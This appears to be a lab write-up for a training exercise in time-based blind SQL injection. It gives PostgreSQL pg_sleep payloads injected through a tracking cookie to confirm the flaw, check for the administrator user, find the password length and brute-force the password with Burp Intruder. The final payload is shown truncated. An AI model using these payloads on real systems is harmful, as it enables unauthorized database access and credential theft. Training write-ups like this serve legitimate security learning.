
# Lab: Blind SQL injection with time delays and information retrieval

## Lab Information

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Steps to Reproduce

### Testing Entries

- The `TrackingID` parameter in the `/` path of the web application is vulnerable to SQLi.
- The below payloads are used to verify it. In the below payload `%3B` is URL encoding for `;` 

```sql
'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

- The above payload results in the application to return the response after 10 seconds while the below payload results in the application to respond without delay proving the application is vulnerable to Time Delay based SQLi.

```sql
'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

### Checking User

- The below payload is used to determine whether the `administrator` user is present in the database of the application or not.

```sql
'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

### Finding Password Length

- If the application takes `approx 10 seconds` to respond then the condition is true else false. So logically the first response from the server which will not take any time will indicate the password length.

```sql
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

- The above payload results in no delay so the password length is `20`.

### Bruteforcing Password

- **SETUP**
	- **Payload 2 Configuration**
	    - `§1§` is the **WORDLIST CHARACTER**.
	    - `§1§` will contain one character each line.
	    - `Payload Type -> Bruteforcer` , `Character Set -> abcdefghijklmnopqrstuvwxyz0123456789`, `Min Length -> 1 Max Length -> 1`
	- **Monitoring Delay**
		- To do this, click the **Resource pool** tab in the side panel of the BurpSuite Intruder.
		- Go `Create Custom new Resource Pool` and Name it according to you.
		- Set `Maximum concurrent requests = 1`.
- After setup **Start the Attack** and check the Response received. The delay will be shown in the greater difference in the response received. Since the payload uses `10 seconds` so Response received should be `approx 10,000`.
- **WORKING**
	- If there is no delay then wrong character else correct character.

```sql
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§1§')
```

- So now basically increment each index position till `20` and find the password by noticing the delay in the response received present in the BurpSuite Intruder results column. From the above attack we got the password `jiw730owrdr4uio1wwcm`.

![Solved](./Images/Img1.png)






